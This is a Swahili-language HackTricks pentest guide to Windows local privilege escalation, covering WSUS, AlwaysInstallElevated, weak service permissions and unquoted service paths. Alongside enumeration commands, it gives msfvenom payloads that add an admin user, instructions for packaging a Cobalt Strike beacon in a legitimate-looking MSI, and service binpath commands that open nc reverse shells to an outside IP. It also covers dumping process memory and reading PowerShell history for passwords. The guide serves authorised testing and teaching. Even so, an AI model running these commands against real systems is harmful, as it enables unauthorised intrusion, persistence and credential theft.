# Kupandisha Mamlaka ya Mahali kwa Windows

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Unataka kuona **kampuni yako ikitangazwa kwenye HackTricks**? au unataka kupata upatikanaji wa **toleo jipya la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* Pata [**swagi rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **fuata** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**repo ya hacktricks**](https://github.com/carlospolop/hacktricks) **na** [**repo ya hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

### **Zana bora ya kutafuta njia za kupandisha mamlaka ya mahali kwa Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Nadharia ya Awali ya Windows

### Vitambulisho vya Kufikia

**Ikiwa haujui ni nini Vitambulisho vya Kufikia vya Windows, soma ukurasa ufuatao kabla ya kuendelea:**

{% content-ref url="access-tokens.md" %}
[access-tokens.md](access-tokens.md)
{% endcontent-ref %}

### ACLs - DACLs/SACLs/ACEs

**Angalia ukurasa ufuatao kwa habari zaidi kuhusu ACLs - DACLs/SACLs/ACEs:**

{% content-ref url="acls-dacls-sacls-aces.md" %}
[acls-dacls-sacls-aces.md](acls-dacls-sacls-aces.md)
{% endcontent-ref %}

### Viwango vya Uadilifu

**Ikiwa haujui ni nini viwango vya uadilifu katika Windows unapaswa kusoma ukurasa ufuatao kabla ya kuendelea:**

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

## Udhibiti wa Usalama wa Windows

Kuna vitu tofauti katika Windows vinavyoweza **kukuzuia kuchambua mfumo**, kutekeleza programu za kutekelezwa au hata **kugundua shughuli zako**. Unapaswa **kusoma** ukurasa ufuatao na **kuchambua** mifumo hii yote **ya ulinzi** kabla ya kuanza uchambuzi wa kupandisha mamlaka ya mahali:

{% content-ref url="../authentication-credentials-uac-and-efs/" %}
[authentication-credentials-uac-and-efs](../authentication-credentials-uac-and-efs/)
{% endcontent-ref %}

## Taarifa za Mfumo

### Uchambuzi wa taarifa za toleo

Angalia ikiwa toleo la Windows lina kasoro yoyote inayojulikana (angalia pia visasa vilivyotekelezwa).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Mashambulizi ya Toleo

Hii [tovuti](https://msrc.microsoft.com/update-guide/vulnerability) ni muhimu kwa kutafuta habari za kina kuhusu udhaifu wa usalama wa Microsoft. Hii database ina zaidi ya udhaifu wa usalama 4,700, ikionyesha **eneo kubwa la mashambulizi** ambalo mazingira ya Windows yanatoa.

**Kwenye mfumo**

* _post/windows/gather/enum\_patches_
* _post/multi/recon/local\_exploit\_suggester_
* [_watson_](https://github.com/rasta-mouse/Watson)
* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ina watson iliyomo)_

**Kwa habari za mfumo kwa ndani**

* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Makusanyo ya Github ya mashambulizi:**

* [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Mazingira

Je, kuna siri yoyote/taarifa muhimu iliyohifadhiwa kwenye mazingira ya mazingira?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value
```
### Historia ya PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Faili za Uandishi wa PowerShell

Unaweza kujifunza jinsi ya kuwasha hii kwenye [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### Kumbukumbu ya Moduli ya PowerShell

Maelezo ya utekelezaji wa mfuatano wa PowerShell yanarekodiwa, yakijumuisha amri zilizotekelezwa, mwaliko wa amri, na sehemu za hati. Hata hivyo, maelezo kamili ya utekelezaji na matokeo ya pato huenda yasichukuliwe.

Ili kuwezesha hili, fuata maagizo katika sehemu ya "Faili za Kumbukumbu" ya nyaraka, ukipendelea **"Kumbukumbu ya Moduli"** badala ya **"Kumbukumbu ya PowerShell"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Kutazama matukio 15 ya mwisho kutoka kwenye magogo ya Powershell unaweza kutekeleza:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### Kumbukumbu ya **Kuzuia Bloki ya Script** ya PowerShell

Shughuli kamili na rekodi kamili ya yaliyomo ya utekelezaji wa script inachukuliwa, ikahakikisha kuwa kila bloki ya nambari inadokumentiwa wakati inatekelezwa. Mchakato huu unahifadhi reli kamili ya ukaguzi wa kila shughuli, yenye thamani kwa uchunguzi wa kisayansi na uchambuzi wa tabia mbaya. Kwa kudokumenti shughuli zote wakati wa utekelezaji, ufahamu wa kina katika mchakato unatolewa.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Kumbukumbu za matukio kwa Block ya Script zinaweza kupatikana ndani ya Mwangalizi wa Matukio ya Windows kwenye njia: **Vitendo na Huduma za Kuingiza > Microsoft > Windows > PowerShell > Operesheni**.\
Kuona matukio 20 ya mwisho unaweza kutumia:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Mipangilio ya Mtandao
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Madereva
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Unaweza kudukua mfumo ikiwa visasisho havitakiwi kutumia http**S** bali http.

Anza kwa kuangalia ikiwa mtandao unatumia sasisho la WSUS lisilotumia SSL kwa kukimbia amri ifuatayo:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Ikiwa unapata jibu kama hili:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
Na ikiwa `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ni sawa na `1`.

Kisha, **inaweza kutumiwa kwa faida.** Ikiwa usajili wa mwisho ni sawa na 0, basi, kuingia kwa WSUS itapuuzwa.

Ili kutumia udhaifu huu unaweza kutumia zana kama: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - Hizi ni hati za kudukua zilizotumiwa kama silaha za MiTM kuingiza sasisho za 'bandia' katika trafiki ya WSUS isiyo ya SSL.

Soma utafiti hapa:

{% file src="../../.gitbook/assets/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**Soma ripoti kamili hapa**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Kimsingi, hii ndio kasoro ambayo kosa hili linatumia:

> Ikiwa tuna uwezo wa kurekebisha proksi yetu ya mtumiaji wa ndani, na Sasisho za Windows hutumia proksi iliyoconfigure katika mipangilio ya Internet Explorer, kwa hivyo tuna uwezo wa kutekeleza [PyWSUS](https://github.com/GoSecure/pywsus) kwa usalama kuingilia trafiki yetu wenyewe na kutekeleza nambari kama mtumiaji aliyeinuliwa kwenye mali yetu.
>
> Zaidi ya hayo, tangu huduma ya WSUS hutumia mipangilio ya mtumiaji wa sasa, pia itatumia hifadhi yake ya vyeti. Ikiwa tunazalisha cheti cha kujisaini kwa jina la mwenyeji wa WSUS na kuongeza cheti hiki kwenye hifadhi ya vyeti ya mtumiaji wa sasa, tutaweza kuingilia trafiki ya WSUS ya HTTP na HTTPS. WSUS haitumii mifumo kama ya HSTS kutekeleza uthibitisho wa aina ya kuamini kwa matumizi ya kwanza kwenye cheti. Ikiwa cheti kilichowasilishwa kinaaminika na mtumiaji na kina jina la mwenyeji sahihi, kitakubaliwa na huduma.

Unaweza kutumia udhaifu huu kwa kutumia zana [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (baada ya kutolewa).

## KrbRelayUp

Kuna udhaifu wa **kuinua mamlaka ya ndani** katika mazingira ya **uwanja wa Windows** chini ya hali maalum. Hali hizi ni pamoja na mazingira ambapo **LDAP signing haijatekelezwa,** watumiaji wanamiliki haki za kujiruhusu kuweka **Utekelezaji wa Kudhibitiwa wa Rasilimali kulingana na Rasilimali (RBCD),** na uwezo wa watumiaji kuunda kompyuta ndani ya uwanja. Ni muhimu kutambua kuwa mahitaji haya yanakidhiwa kwa kutumia **mipangilio ya msingi**.

Pata **udukuzi** katika [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Kwa habari zaidi kuhusu mchakato wa shambulio angalia [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Ikiwa** hizi 2 usajili zime **wezeshwa** (thamani ni **0x1**), basi watumiaji wa aina yoyote ya mamlaka wanaweza **kusanikisha** (kutekeleza) faili za `*.msi` kama NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Malipo ya Metasploit
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Ikiwa una kikao cha meterpreter unaweza kiotomatisha mbinu hii kwa kutumia moduli **`exploit/windows/local/always_install_elevated`**

### PowerUP

Tumia amri `Write-UserAddMSI` kutoka kwa power-up ili kuunda ndani ya saraka ya sasa faili ya Windows MSI ili kuinua mamlaka. Skripti hii hutoa mshughulikaji wa MSI uliopangwa mapema ambao unauliza kuongeza mtumiaji/kikundi (hivyo utahitaji ufikiaji wa GIU):
```
Write-UserAddMSI
```
### Kitekeleza

Soma mafunzo haya ili kujifunza jinsi ya kuunda kifuniko cha MSI ukitumia zana hii. Tafadhali kumbuka unaweza kufunika faili ya "**.bat**" ikiwa unataka **tu** kutekeleza **mistari ya amri**

{% content-ref url="msi-wrapper.md" %}
[msi-wrapper.md](msi-wrapper.md)
{% endcontent-ref %}

### Unda MSI na WIX

{% content-ref url="create-msi-with-wix.md" %}
[create-msi-with-wix.md](create-msi-with-wix.md)
{% endcontent-ref %}

### Unda MSI na Visual Studio

* **Tengeneza** na Cobalt Strike au Metasploit **Windows EXE TCP payload** mpya katika `C:\privesc\beacon.exe`
* Fungua **Visual Studio**, chagua **Unda mradi mpya** na andika "msakinishaji" katika sanduku la utaftaji. Chagua mradi wa **Mchawi wa Usanidi** na bonyeza **Next**.
* Toa jina kwa mradi, kama **AlwaysPrivesc**, tumia **`C:\privesc`** kwa eneo, chagua **weka suluhisho na mradi katika saraka moja**, na bonyeza **Unda**.
* Endelea kubonyeza **Next** hadi ufike hatua ya 3 kati ya 4 (chagua faili za kujumuisha). Bonyeza **Ongeza** na chagua mzigo wa Beacon uliyoumba. Kisha bonyeza **Maliza**.
* Fanya mstari wa **AlwaysPrivesc** katika **Mtafutaji wa Suluhisho** na katika **Mali**, badilisha **TargetPlatform** kutoka **x86** hadi **x64**.
* Kuna mali nyingine unaweza kubadilisha, kama **Mwandishi** na **Mzalishaji** ambayo inaweza kufanya programu iliyosakinishwa ionekane halali zaidi.
* Bonyeza kulia kwenye mradi na chagua **Tazama > Vitendo vya Desturi**.
* Bonyeza kulia **Sakinisha** na chagua **Ongeza Hatua ya Desturi**.
* Bonyeza mara mbili kwenye **Folda ya Maombi**, chagua faili yako ya **beacon.exe** na bonyeza **Sawa**. Hii itahakikisha kuwa mzigo wa beacon unatekelezwa mara tu msakinishaji unapoendeshwa.
* Chini ya **Mali za Hatua ya Desturi**, badilisha **Run64Bit** kuwa **Sahihi**.
* Hatimaye, **ijenge**.
* Ikiwa onyo `Faili 'beacon-tcp.exe' ikilenga 'x64' sio sambamba na jukwaa la lengo la mradi 'x86'` linaonyeshwa, hakikisha umeweka jukwaa kuwa x64.

### Usakinishaji wa MSI

Kutekeleza **usakinishaji** wa faili ya `.msi` yenye nia mbaya **kwa siri:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Kutumia udhaifu huu unaweza kutumia: _exploit/windows/local/always\_install\_elevated_

## Programu ya Kupambana na Virusi na Detectors

### Mipangilio ya Ukaguzi

Mipangilio hii inaamua ni nini kinachopigwa **kumbukumbu**, hivyo unapaswa kutilia maanani
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, ni ya kuvutia kujua wapi zinapelekwa kumbukumbu.
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** imeundwa kwa **usimamizi wa nywila za Wasimamizi wa Mitaa**, ikihakikisha kuwa kila nywila ni **ya kipekee, imechanganywa, na updated mara kwa mara** kwenye kompyuta zilizounganishwa kwenye kikoa. Nywila hizi zimehifadhiwa kwa usalama ndani ya Active Directory na zinaweza kupatikana tu na watumiaji ambao wamepewa ruhusa za kutosha kupitia ACLs, kuwaruhusu kuona nywila za wasimamizi wa mitaa ikiwa wameruhusiwa.

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

### WDigest

Ikiwa imeamilishwa, **nywila za maandishi wazi zimehifadhiwa kwenye LSASS** (Local Security Authority Subsystem Service).\
[**Maelezo zaidi kuhusu WDigest kwenye ukurasa huu**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### Kinga ya LSA

Kuanzia **Windows 8.1**, Microsoft iliingiza kinga iliyoboreshwa kwa Mamlaka ya Usalama wa Ndani (LSA) ili **kuzuia** jaribio la michakato isiyosadikika **kusoma kumbukumbu yake** au kuingiza namna ya kanuni, ikilinda mfumo zaidi.\
[**Maelezo zaidi kuhusu Kinga ya LSA hapa**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Mlinzi wa Vyeti

**Mlinzi wa Vyeti** uliingizwa katika **Windows 10**. Lengo lake ni kulinda vyeti vilivyohifadhiwa kwenye kifaa dhidi ya vitisho kama mashambulizi ya pass-the-hash.| [**Maelezo zaidi kuhusu Mlinzi wa Vyeti hapa.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Maelezo ya Mipokezi Iliyohifadhiwa

**Mipokezi ya kikoa** huthibitishwa na **Mamlaka ya Usalama ya Ndani** (LSA) na hutumiwa na vipengele vya mfumo wa uendeshaji. Wakati data ya kuingia ya mtumiaji inathibitishwa na pakiti ya usalama iliyosajiliwa, kawaida mipokezi ya kikoa kwa mtumiaji huanzishwa.\
[**Maelezo zaidi kuhusu Mipokezi Iliyohifadhiwa hapa**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Watumiaji & Vikundi

### Kuchunguza Watumiaji & Vikundi

Unapaswa kuangalia ikiwa kuna kikundi chochote ambacho unahusishwa nacho kina ruhusa za kuvutia
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Vikundi vya haki za juu

Ikiwa **unaingia katika kikundi cha haki za juu unaweza kuinua haki za upendeleo**. Jifunze kuhusu vikundi vya haki za juu na jinsi ya kuzitumia vibaya kuinua haki za upendeleo hapa:

{% content-ref url="../active-directory-methodology/privileged-groups-and-token-privileges.md" %}
[privileged-groups-and-token-privileges.md](../active-directory-methodology/privileged-groups-and-token-privileges.md)
{% endcontent-ref %}

### Usindikaji wa Token

**Jifunze zaidi** kuhusu ni nini **token** katika ukurasa huu: [**Windows Tokens**](../authentication-credentials-uac-and-efs/#access-tokens).\
Angalia ukurasa ufuatao kujifunza kuhusu token za kuvutia na jinsi ya kuzitumia vibaya:

{% content-ref url="privilege-escalation-abusing-tokens.md" %}
[privilege-escalation-abusing-tokens.md](privilege-escalation-abusing-tokens.md)
{% endcontent-ref %}

### Watumiaji walioingia / Vikao
```bash
qwinsta
klist sessions
```
### Vyeo vya Nyumbani
```powershell
dir C:\Users
Get-ChildItem C:\Users
```
### Sera ya Nywila
```bash
net accounts
```
### Pata maudhui ya ubao wa kunakili
```bash
powershell -command "Get-Clipboard"
```
## Mchakato wa Kufanya Kazi

### Mamlaka za Faili na Folda

Kwanza kabisa, orodhesha mchakato **angalia nywila ndani ya mstari wa amri ya mchakato**.\
Angalia kama unaweza **kubadilisha baadhi ya faili zinazoendeshwa** au kama una ruhusa ya kuandika kwenye folda ya faili ili kutumia mashambulizi ya [**Udukuzi wa DLL**](dll-hijacking/):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Hakikisha kila wakati kuna [**wadukuzi wa electron/cef/chromium** wanaofanya kazi, unaweza kuitumia kwa kujipandisha viwango vya ruhusa](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Kuangalia ruhusa za mchakato wa faili za binary**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Kuangalia ruhusa za folda za mchakato wa binaries (**[**DLL Hijacking**](dll-hijacking/)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Kuchimba Nywila za Kumbukumbu

Unaweza kuunda kumbukumbu ya mchakato unaoendelea kutumia **procdump** kutoka kwa sysinternals. Huduma kama FTP ina **nywila wazi kwenye kumbukumbu**, jaribu kuchimba kumbukumbu na kusoma nywila.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Programu za GUI zisizo salama

**Programu zinazoendeshwa kama SYSTEM zinaweza kuruhusu mtumiaji kuanzisha CMD, au kutazama directories.**

Mfano: "Msaada na Usaidizi wa Windows" (Windows + F1), tafuta "amri ya amri", bofya "Bofya kufungua Amri ya Amri"

## Huduma

Pata orodha ya huduma:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Ruhusa

Unaweza kutumia **sc** kupata habari ya huduma
```bash
sc qc <service_name>
```
Ni vyema kuwa na binary **accesschk** kutoka _Sysinternals_ ili kuangalia kiwango cha ruhusa kinachohitajika kwa kila huduma.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Ni vyema kuhakikisha ikiwa "Watumiaji Waliothibitishwa" wanaweza kurekebisha huduma yoyote:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Unaweza kupakua accesschk.exe kwa XP hapa](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Wezesha huduma

Ikiwa una kosa hili (kwa mfano na SSDPSRV):

_Kosa la mfumo 1058 limetokea._\
_Huduma haiwezi kuanza, ama kwa sababu imelemazwa au kwa sababu haina vifaa vilivyowezeshwa vinavyohusiana nayo._

Unaweza kuwezesha kwa kutumia
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Chukua kufahamu kwamba huduma ya upnphost inategemea SSDPSRV kufanya kazi (kwa XP SP1)**

**Mbinu nyingine** ya tatizo hili ni kukimbia:
```
sc.exe config usosvc start= auto
```
### **Badilisha njia ya binary ya huduma**

Katika hali ambapo kikundi cha "Watumiaji waliothibitishwa" wanamiliki **SERVICE\_ALL\_ACCESS** kwenye huduma, ubadilishaji wa binary ya kutekelezeka ya huduma ni wa kufanyika. Ili kubadilisha na kutekeleza **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Anza tena huduma
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Upendeleo unaweza kuongezeka kupitia idhini mbalimbali:

* **SERVICE\_CHANGE\_CONFIG**: Inaruhusu upyaishaji wa faili ya huduma.
* **WRITE\_DAC**: Inawezesha upyaishaji wa idhini, ikiongoza kwa uwezo wa kubadilisha mipangilio ya huduma.
* **WRITE\_OWNER**: Inaruhusu kupata umiliki na upyaishaji wa idhini.
* **GENERIC\_WRITE**: Inarithi uwezo wa kubadilisha mipangilio ya huduma.
* **GENERIC\_ALL**: Pia inarithi uwezo wa kubadilisha mipangilio ya huduma.

Kwa kugundua na kutumia udhaifu huu, _exploit/windows/local/service\_permissions_ inaweza kutumika.

### Mipangilio dhaifu ya faili za huduma

**Angalia ikiwa unaweza kuhariri faili ya binari inayotekelezwa na huduma** au ikiwa una **idhini ya kuandika kwenye folda** ambapo faili ya binari inapatikana ([**DLL Hijacking**](dll-hijacking/))**.**\
Unaweza kupata kila faili ya binari inayotekelezwa na huduma kwa kutumia **wmic** (siyo katika system32) na angalia idhini zako kwa kutumia **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Unaweza pia kutumia **sc** na **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Huduma za ruhusa ya kurekebisha usajili

Unapaswa kuangalia ikiwa unaweza kurekebisha usajili wa huduma yoyote.\
Unaweza **kuangalia** ruhusa zako juu ya usajili wa huduma kwa kufanya:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Ni vyema kuhakikisha kwamba **Watumiaji Waliothibitishwa** au **NT AUTHORITY\INTERACTIVE** wanamiliki ruhusa za `FullControl`. Ikiwa ndivyo, faili ya binari inayotekelezwa na huduma inaweza kubadilishwa.

Kubadilisha Njia ya binari inayotekelezwa:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Huduma za Usajili wa Leseni za Kuongeza Data/Ongeza Ruhusa ya Subdirectory

Ikiwa una ruhusa hii juu ya usajili hii inamaanisha **unaweza kuunda usajili wa chini kutoka kwa huu**. Kwa huduma za Windows hii ni **ya kutosha kutekeleza nambari ya kupita kiasi:**

{% content-ref url="appenddata-addsubdirectory-permission-over-service-registry.md" %}
[appenddata-addsubdirectory-permission-over-service-registry.md](appenddata-addsubdirectory-permission-over-service-registry.md)
{% endcontent-ref %}

### Njia za Huduma Zisizowekwa Alama

Ikiwa njia ya kutekelezwa haipo ndani ya alama, Windows itajaribu kutekeleza kila mwisho kabla ya nafasi.

Kwa mfano, kwa njia _C:\Program Files\Some Folder\Service.exe_ Windows itajaribu kutekeleza:
```powershell
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
### Orodhesha njia zote za huduma ambazo hazijatajwa, isipokuwa zile zinazomilikiwa na huduma za Windows zilizojengwa:
```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services

#Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
